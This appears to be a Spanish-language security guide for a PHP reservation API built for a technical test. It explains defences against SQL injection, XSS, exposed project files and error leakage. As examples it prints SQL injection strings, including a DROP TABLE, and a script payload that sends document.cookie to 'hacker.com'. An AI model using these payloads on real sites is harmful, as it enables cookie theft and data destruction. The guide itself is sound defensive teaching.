# 06 — Seguridad y Buenas Prácticas Aplicadas

En el enunciado de la prueba técnica, MisterPlan subraya:
> *"Ten cuidado con la seguridad. Es una API que recibe datos de fuera; piensa en ello. Lo revisamos a fondo."*

En esta guía te explicamos **qué peligros existen en la web** y **cómo los hemos neutralizado** en nuestro código.

---

## 🛡️ 1. Prevención de Inyección SQL (SQL Injection)

### ¿Qué es el peligro?
Un atacante podría rellenar el campo de búsqueda con:
`' OR '1'='1`  
Si concatenáramos texto en SQL (`"SELECT * FROM reserva WHERE nombre = '" . $nombre . "'"`), el atacante podría ver todas las reservas de la base de datos o incluso borrar tablas enteras con `; DROP TABLE reserva;`.

### Cómo lo solucionamos:
En `src/Repositories/ReservaRepository.php` y `EventoRepository.php`:
1. **100% de las consultas utilizan Sentencias Preparadas (Prepared Statements):**
   ```php
   $stmt = $this->db->prepare("SELECT * FROM reserva WHERE id = :id");
   $stmt->execute([':id' => $id]);
   ```
   Los valores nunca se mezclan con la orden SQL; el motor de base de datos los trata estrictamente como datos inertes.
2. **Desactivación de Emulación de Preparadas:**
   En `src/Config/Database.php` configuramos:
   ```php
   PDO::ATTR_EMULATE_PREPARES => false
   ```
   Esto obliga a que la preparación se haga a nivel del protocolo binario nativo de MySQL, eliminando cualquier posibilidad de bypass por encoding de caracteres.

---

## 🛡️ 2. Prevención de Cross-Site Scripting (XSS)

### ¿Qué es el peligro?
Un usuario malintencionado podría introducir en el nombre del huésped un script dañino:
`<script>fetch('http://hacker.com/robar-cookies?c=' + document.cookie)</script>`
Si la aplicación imprimiera ese nombre tal cual en la pantalla de un recepcionista o administrador, el navegador ejecutaría el código del atacante.

### Cómo lo solucionamos:
1. **Auto-Escaping en Twig:**
   Twig escapa automáticamente cualquier variable que se pinte con `{{ variable }}`. Convierte los caracteres peligrosos (`<`, `>`, `"`, `'`, `&`) en entidades HTML seguras (`&lt;`, `&gt;`).
2. **Sanitización en JavaScript:**
   En `public/assets/js/app.js` y `detalle.js`, antes de insertar cualquier texto dinámico en el DOM, pasa por la función de escape:
   ```javascript
   function escapeHtml(text) {
       const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
       return text.toString().replace(/[&<>"']/g, m => map[m]);
   }
   ```
3. **Cabecera Anti-Sniffing:**
   En `src/Core/Response.php` enviamos en cada respuesta:
   ```php
   header('X-Content-Type-Options: nosniff');
   ```

---

## 🛡️ 3. Validación y Sanitización Estricta en Servidor

Una regla básica de ciberseguridad es: **"Nunca te fíes del cliente"**.
Un usuario con conocimientos puede desactivar el JavaScript de su navegador o enviar peticiones directas con Postman manipulando cualquier campo.

Por eso, `ReservaService.php` valida en el servidor:
- **Email:** Que cumpla el estándar RFC con `filter_var($email, FILTER_VALIDATE_EMAIL)`.
- **Fechas:** Que existan en el calendario gregoriano y que la salida sea posterior a la entrada.
- **Importes:** Que no sean negativos ni cero.
- **Identificadores (IDs):** Que sean números enteros positivos (`FILTER_VALIDATE_INT`).

---

## 🛡️ 4. Aislamiento del Document Root (`/public`)

En muchas aplicaciones antiguas mal configuradas, toda la carpeta del proyecto está expuesta a internet. Si alguien visita `http://misitio.com/.git/` o `http://misitio.com/.env`, podría descargarse el código fuente o las contraseñas de la base de datos.

En nuestro proyecto:
- **Solo la carpeta `public/` es accesible por la web.**
- Las carpetas `src/`, `templates/`, `tests/`, `database.sql` y `vendor/` están un nivel por encima, **físicamente inaccesibles** desde cualquier navegador web.

---

## 🛡️ 5. Control de Fugas de Información (Information Disclosure)

Si se produce un error en la base de datos, mostrar el mensaje completo de la excepción con el stack trace y las contraseñas al usuario final es una vulnerabilidad crítica.

En nuestra clase `src/Core/Router.php`:
- Capturamos cualquier excepción no controlada (`Throwable`).
- Al cliente solo se le devuelve un mensaje amigable y limpio:
  ```json
  {
      "success": false,
      "message": "Error interno del servidor"
  }
  ```
